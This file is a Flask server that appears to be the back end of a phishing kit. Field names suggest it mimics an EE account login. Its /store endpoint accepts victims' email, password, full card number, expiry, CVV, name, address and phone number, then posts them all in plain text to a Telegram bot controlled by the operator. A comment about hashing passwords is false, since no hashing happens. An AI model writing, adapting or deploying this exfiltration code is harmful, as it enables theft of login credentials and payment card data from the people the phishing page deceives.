from flask import Flask, request, jsonify
import os
import requests
from dotenv import load_dotenv
from flask_cors import CORS

# Load from .env file
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

app = Flask(__name__)

CORS(app, resources={r"/store": {"origins": "*"}}, supports_credentials=False)

@app.route("/store", methods=["POST"])
def store():
    if request.method == "OPTIONS":
        # Flask-CORS will add the right headers; returning 200 is enough
        return "", 200
    data = request.get_json() or {}
    email = data.get("ee_email")
    password = data.get("ee_password")
    cardNum = data.get('cardNumber')
    expiryMonth = data.get('expiryMonth')
    expiryYear = data.get('expiryYear')
    nameOnCard = data.get('nameOnCard')
    securityCode = data.get('securityCode')
    houseNumber = data.get('houseNumber')
    streetAddress = data.get('streetAddress')
    postcode = data.get('postcode')
    cardName = data.get('cardName')
    phoneNum = data.get('phoneNumber')
    # Hash password before storing

    message = f"🔐 Login\nEmail: {email}\nPassword: {password}\n Card number: {cardNum}\n expiry month: {expiryMonth}\n expiry year: {expiryYear}\n Name: {nameOnCard}\n cvv: {securityCode}\n Address: {houseNumber} {streetAddress} {postcode}\n Number: {phoneNum} \n Card Name: {cardName}"
    

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
    'chat_id': CHAT_ID,
    'text': message
    }
    
    
    resp = requests.post(url, json=payload)
   
    if resp.status_code != 200:
        print(resp.text)
        
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
    
